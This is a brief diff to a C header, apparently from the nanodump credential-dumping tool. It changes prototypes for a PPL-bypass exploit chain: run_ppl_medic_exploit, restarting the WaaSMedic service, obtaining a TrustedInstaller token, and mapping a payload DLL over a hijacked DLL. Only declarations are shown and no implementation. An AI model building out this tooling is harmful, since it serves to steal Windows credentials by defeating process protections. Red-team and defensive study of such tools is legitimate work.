@@ -1,5 +1,6 @@
 #pragma once
 
+#include "impersonate.h"
 #include "token_priv.h"
 #include "dinvoke.h"
 #include "handle.h"
@@ -166,12 +167,9 @@ typedef BOOL(WINAPI* UnlockFile_t)(HANDLE hFile, DWORD dwFileOffsetLow, DWORD dw
 #define NtGetCurrentProcess() ( ( HANDLE ) ( LONG_PTR ) - 1 )
 #define NtGetCurrentThread() ( ( HANDLE ) ( LONG_PTR ) - 2 )
 
-
-
 BOOL run_ppl_medic_exploit(
-    IN LPCSTR dump_path,
-    IN BOOL use_valid_sig,
-    IN BOOL duplicate_handle);
+    IN unsigned char nanodump_ppl_medic_dll[],
+    IN unsigned int nanodump_ppl_medic_dll_len);
 
 BOOL restart_waa_s_medic_svc();
 
@@ -197,6 +195,8 @@ BOOL get_trusted_installer_token(
     OUT PHANDLE hTI);
 
 BOOL map_payload_dll(
+    IN unsigned char nanodump_ppl_medic_dll[],
+    IN unsigned int nanodump_ppl_medic_dll_len,
     IN LPWSTR HijackedDllName,
     IN LPWSTR HijackedDllSectionPath,
     OUT LPWSTR* HollowedDllPath,
